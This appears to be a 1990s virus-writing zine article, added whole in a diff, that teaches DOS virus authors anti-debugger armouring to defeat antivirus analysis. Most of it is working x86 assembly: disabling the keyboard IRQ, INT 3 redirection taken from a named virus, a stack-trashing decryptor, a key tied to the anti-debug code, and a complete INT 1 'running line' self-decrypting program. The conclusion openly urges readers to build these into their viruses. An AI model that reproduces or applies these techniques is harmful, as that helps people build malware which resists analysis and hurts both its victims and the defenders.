@@ -1,0 +1,362 @@
+                      Anti-Debugger Techniques
+                      ~~~~~~~~~~~~~~~~~~~~~~~~
+
+                -THE-MASTER-HIDES-BEHIND-THE-MASK-
+
+
+        Ok, now the AV can not even  get your virus to infect their bait
+files,  and if they do finally manage,  they will have great problems in
+getting a complete,  accurate view of what they are dealing with.  There
+is two things they can do:
+
+1. Disassemble your Anti-Bait code,  and create a Bait maker to fool it.
+2. Disassemble your Polymorphic engine, and work out what to look for.
+
+        Both of  the  above  can  be  defeated  by  using  Anti-Debugger
+Techniques.  The first is defeated by  keeping your Anti - Bait routines
+encrypted, and heavilly armoured, to prevent disassembly. The second can
+be defeated by using the same  methods on your polymorphic engine.  This
+section has been designed to tell you how to do it.
+
+              Anti-Debugger Techniques: The Obvious
+              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        There are many simple and trivial ways to thwart debuggers. This
+document will deal mainly with more advanced methods. The simple methods
+outlined in this section can be seen in the code example of  "Using Your
+Anti-Debug Routines as the Decryption Key", later on in this document.
+
+        Perhaps the most obvious way to kill a debugger, is to overwrite
+the Interrupt Vector  of  Interrupts 1 (Debug Single Step), and 3 (Debug
+Break Point). This can be defeated by simply skipping the instructions.
+Another thing you could do, is place an INT 3 in a long loop, which will
+cause the debugger to stop at the INT 3 each iteration,  which will stop
+the AV from simply proceeding through the loop.  This  is  very  easilly
+defeated by NOP'ing out the INT 3.
+
+        Another thing to do, is turn of the keyboard. There are manyways
+to do this, but the simplest is:        IN      AL,20h ;Turn of Keyboard IRQ
+                                        OR      AL,02
+                                        OUT     AL,20
+
+                                        <virus code>
+
+                                        IN      AL,20   ;Enable Keyboard IRQ
+                                        AND     AL,NOT 2
+                                        OUT     AL,20
+
+           Anti-Debugger Techniques: Interrupt Replacement
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        This technique involves replacing the vector of a  INTERRUPT 1/3
+with the interrupt off another interrupt, and calling that instead. This
+works especially well with INT 3, as it is only 1 byte long, and can not
+simply be replaced with the proper Interrupt. Here is an example of  INT
+replacement from the virus [H8urNMEs].  It changes INT 3 to point to the
+tunneled INT 21, and calls INT 3 for all DOS requests:
+------------------------------------------------------------------------
+
+        mov     ax,3503
+        int     21
+
+        mov     int_3_seg,es
+        mov     int_3_off,bx
+
+        lds     dx, site_traced_off
+        mov     ax,2503
+        int     21
+
+        mov     ds,cs
+
+        mov     ax,3524
+        int     3
+
+        mov     int_24_seg,es
+        mov     int_24_off,bx
+------------------------------------------------------------------------
+
+        It simply makes INT 3 point to DOS,  and uses this fact to fetch
+the INT 24 vector.
+
+       Anti-Debugger Techniques: INT 1 Tracing Destroys the Stack
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       When tracing through code,  with INT 1,  the 6 bytes below SP are
+overwritten with the pushed returnig IP, CS, and Flags. There are 2 ways
+to take advantage of this fact.  The first is to PUSH a value on to  the
+stack, POP it, and then adjust SP and POP it again to see if it changes.
+If it has, the code has been traced. Here is an example:
+------------------------------------------------------------------------
+
+                PUSH    AX
+                POP     AX
+                DEC     SP
+                DEC     SP
+                POP     BX              ;BX should point to the pushed AX.
+                CMP     AX,BX
+                JNE     CODE_IS_TRACED
+------------------------------------------------------------------------
+
+        The second  way is to store  a critigal value  like a Decryption
+key in SP. This value should also point to the code, and you should  NOT
+use any stack operations. This way,  if a debugger is running,  the code
+that SP  points to will  be overwritten.  Here is a  complete program to
+illustrate it. To make it run properly,  you must have to encrypt it.  I
+will not how you how.. If you can not work it out you should not even be
+reading this.  It also has the  added advantage of avoiding the TBAV '#'
+(decryptor) flag. Any way here it is:
+------------------------------------------------------------------------
+;STACK.ASM
+
+        radix   16
+
+elength equ     (end - estart)/2
+
+        org     100
+
+        mov     bp,sp
+        cli
+        mov     sp,estart
+        sti
+
+        mov     bx,sp
+        mov     cx,elength
+
+eloop:  xor     cs:[bx],sp      ;SP is decryption key.
+        inc     bx
+        inc     bx              ;If a Debugger is running,
+        cli                     ;All the code after ESTART will be
+        add     sp,6            ;overwritten.
+        sti
+        loop    eloop
+
+estart:
+        cli
+        mov     sp,bp
+        sti
+
+        mov     ah,9
+        mov     dx,offset msg - 12
+        add     dx,12
+        int     21
+        mov     ah,4c
+        int     21
+
+msg     db      'Yeah!!$'
+
+end:
+
+------------------------------------------------------------------------
+
+ Anti-Debugger Techniques: Use Your Anti-Debug Routines as The Decrypt Key
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        This is a lot easier to do then it sounds. Basically, all you have
+to do is retreive a byte from the Anti - Debugger routines each time,  and
+use it to modify your decryption routine in some manor. Of course the code
+you are decrypting must have been encrypted in a corresponding manner! Any
+way, here is a code fragment example:
+------------------------------------------------------------------------
+
+;This code LODSBs a byte from the Anti-Debug routine, on each iteration,
+;and ADDs it to the XOR key. Because of this the AV can not simply NOP
+;out the INT 3, and other traps in the Anti-Debug routine which is called
+;on each iteration! DEC_START is assumed to be the offset of the start of
+;the encrypted code, while DEC_LENGTH is the number of bytes to decrypt.
+
+                mov     dl,0aa  ;initial key.
+
+decrypt:        mov     di,offset dec_start
+                mov     cx,dec_length
+                mov     si,offset decrypt       ;offset of code to use
+                                                ;to modify decryption key.
+dec_loop:       lodsb                           ;AL=byte from anti-debug
+                                                ;routines
+
+                add     dl,al                   ;MODIFY KEY. If code has been
+                                                ;modified, the key will be
+						;wrong.
+
+                xor     [di],dl                 ;decrypt
+                inc     di
+
+                call    anti_debug              ;kill debuggers.
+                                                ;this call cant be NOP'd out,
+                                                ;as it is part of the Decrypt
+                                                ;key.
+
+                cmp     si,offset end_ad        ;if SI has reached end of
+                jne     no_fix                  ;anti-debug code, reset it.
+                mov     si,offset decrypt
+
+no_fix:         loop    dec_loop
+
+                jmp     dec_start               ;JMP past Anti_Debug to
+                                                ;the newly decrypted code..
+
+Anti_Debug:     in      al,20   ;get IRQ status.
+                or      al,2    ;Disable IRQ 1 (keyboard)
+                out     20,al
+
+                int     3       ;stop the debugger on each loop (you cant
+                int     3       ;NOP these out!), note that when the debugger
+                                ;stops here, the keyboard will be disabled,
+                                ;so the can't do any thing!
+
+
+                push    ax
+                push    ds
+                xor     ax,ax
+                mov     ds,ax
+                xchg    ax,[4]  ;Kill INT 1
+                int     3       ;Fuck with their heads
+                xchg    ax,[4]  ;restore INT 1
+                pop     ds
+
+                mov     ax,offset ad_jmp        ;destination of JMP
+                push    ax
+                pop     ax
+                dec     ax
+                dec     ax      ;if this code was traced, AX will no longer
+                pop     ax      ;be equal to the JMP destination
+                jmp     ax
+                pop     ax
+                ret
+
+        (BELOW CODE IS ENCRYPTED)
+dec_start:      in      al,20
+                and     al,NOT 2
+                out     20,al   ;Re-Enable Key board..
+
+                <REST OF VIRUS CODE>
+
+------------------------------------------------------------------------
+
+                Anti-Debugger Techniques: The Running Line
+                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        The last method, I am going to illustrate, is called the Running
+Line. It is VERY resistant to debuggers. It involves hooking INT 1,  and
+Decrypting each instruction _JUST BEFORE_ it's run, and Re-Encrypting it
+_STRAIGH AFTER_ it has been executed.  This way, only _1_ instruction at
+a time is decrypted in memory. Here is a fully working example.
+------------------------------------------------------------------------
+
+;RUNLINE.ASM
+
+        radix   16
+
+        org     100
+
+        xor     ax,ax                   ;ax=0
+        mov     es,ax                   ;es=ax=0
+        mov     di,es:W[4]
+        mov     si,es:W[6]              ;save int 1 vector
+        mov     es:W[4],offset tracer
+        mov     es:W[6],cs              ;int1 = cs:tracer
+        mov     bp,sp
+        pushf
+        or      B[bp-1],1               ;set TRACE flag
+        popf                            ;set it
+
+        xor     dx,dx                   ;this serves no purpose, and
+                                        ;is just here because the first
+                                        ;instruction after setting the
+                                        ;flag is not traced.
+
+;**********************************************************************
+;** The below data, is the Encrypted instructions. The INT 1 handler **
+;** only decrypts instruction on WORD (EVEN) boundaries. It XORs the **
+;** instruction (WORD) with its offset in CS (ie. it's IP when it's  **
+;** run). Thats why each word is XOR'd with $ (it's position).       **
+;**********************************************************************
+
+        dw      01f0e   XOR     $       ;PUSH CS / POP DS
+        dw      009b4   XOR     $       ;MOV AH,9h
+        dw      0ba90   XOR     $       ;NOP / MOV DX,
+        dw      offset msg              ;offset msg
+        dw      021cd   XOR     $       ;INT 21h
+        dw      0e589   XOR     $       ;MOV BP,SP
+        dw      06680   XOR     $       ;AND B[BP+,
+        dw      0feff                   ;FF],FE (turn off TRACE flag).
+
+last_enc        equ             $
+        dw      0bb9d   XOR     $       ;POPF / MOV BX,
+        dw      last_enc                ;LAST_ENC
+
+        xor     cs:W[bx],bx             ;re-encrypt last instruction..
+
+        mov     es:W[4],di
+        mov     es:W[6],si              ;restore int 1 vector
+
+        mov     ah,4c
+        int     21
+
+;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+;THINGS TO NOTE FROM THE ABOVE: Firstly, in the instructions
+;       NOP
+;       MOV     DX,OFFSET MSG
+;the MOV DX opcode is on an odd boundary, and hence, the decryptor will
+;not decrypt it. Secondly the 'DW OFFSET MSG' in MOV     DX,OFFSET MSG
+;is not encrypted, because it it is data from another instruction, and
+;therefore it will never be executed, and passed to the INT 1 handler.
+;The same goes for the +FF(-1),FE in the AND B[BP-1],FE.
+
+
+;**********************************************************************
+;** The following procedure, is the work horse of this code. The CPU **
+;** will call this INT 1 handler before each opcode as long as the   **
+;** TRACE flag is set. Unlike most INT 1 handlers that you'll see in **
+;** virii, this contains no defensive traps. This is because we are  **
+;** tracing our own code, and not unknown (possibly hostile) code.   **
+;** It retrieves the calling IP from the stack, and if it is odd,    **
+;** exits. If even, it will re-encrypt the previous instruction, and **
+;** decrypt the current one. It saves the calling IP, so that it can **
+;** re-encrypt it when it is called for the next instruction.        **
+;**********************************************************************
+
+tracer:
+        push    bp                      ;save BP
+        mov     bp,sp                   ;BP=SP for reference point of stack.
+        push    si                      ;save SI
+        mov     bp,W[bp+2]              ;BP = calling IP (position of
+                                        ;encrypted instruction).
+        test    bp,1                    ;check if on an odd boundry..
+        jnz     is_odd                  ;it is so leave.
+        mov     si,cs:last              ;else get the position of the last
+                                        ;decrypted instruction to reincrypt.
+        mov     cs:last,bp              ;save current position for next time.
+        xor     cs:W[si],si             ;re-encrypt last (XOR it with its IP)
+        xor     cs:W[bp],bp             ;decrypt current (XOR it with its IP)
+is_odd:
+        pop     si                      ;restore SI
+        pop     bp                      ;restore BP
+        iret                            ;adeos!
+
+last    dw      0                       ;last IP for re-encrpytion..
+msg     db      'Yeah!!$'               ;EVERYBODY SAY YEAH!!!!
+------------------------------------------------------------------------
+
+                                CONCLUSION
+                                ~~~~~~~~~~
+
+               -TAUGHT-WHEN-WE-ARE-YOUNG-TO-HATE-ONE-ANOTHER-
+
+        I STRONGLY urge you to employ the above techniques in your virii
+and/or poly engine. If your virus refuses to infect bait files,  is VERY
+heavilly armoured,  so the can not decrypt it,  and dissasemble it,  and
+mutates so slowly, and on such obscure conditions, HOW ARE THEY GOING TO
+IT? Devising an algorith for such a virus would be _VERY_ difficult.
+
+
+                                BYE -- BYE
+                                ~~~~~~~~~~
+        Thank you reading this article. I hope it's been as interesting
+to read as it has been to write!! Hopefully,  we will  be seeing the  AV
+having to work _ALOT_ harder for their money too ;). Alternitively, this
+could be some help to the AV community, so they can see what lies ahead.
+
+        If you have any questions, comments, critisms, or new ideas, you
+can get in touch with me on IRC, channel #VIRUS, Nickname 'Sepultura' or
+'Sep'. I would really appreciate _ANY_ comments (excpet 'Get Bent!!').
+
+
+
+                              - THE - END -
+================================================================================
